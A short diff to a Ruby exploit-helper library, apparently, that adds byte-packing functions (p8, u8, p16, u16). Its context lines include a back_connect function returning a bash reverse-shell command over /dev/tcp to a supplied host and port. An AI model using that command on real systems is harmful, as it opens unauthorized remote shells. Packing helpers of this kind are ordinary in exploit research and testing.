@@ -236,6 +236,22 @@ def back_connect(host, port)
   "/bin/bash -c 'bash -i >&' /dev/tcp/#{host}/#{port} 0>&1'"
 end
 
+def p8(*x)
+  x.pack("C*")
+end
+
+def u8(x)
+  x.unpack("C*")
+end
+
+def p16(*x)
+  x.pack("S*")
+end
+
+def u16(x)
+  x.unpack("S*")
+end
+
 def p32(*x)
   x.pack("L*")
 end
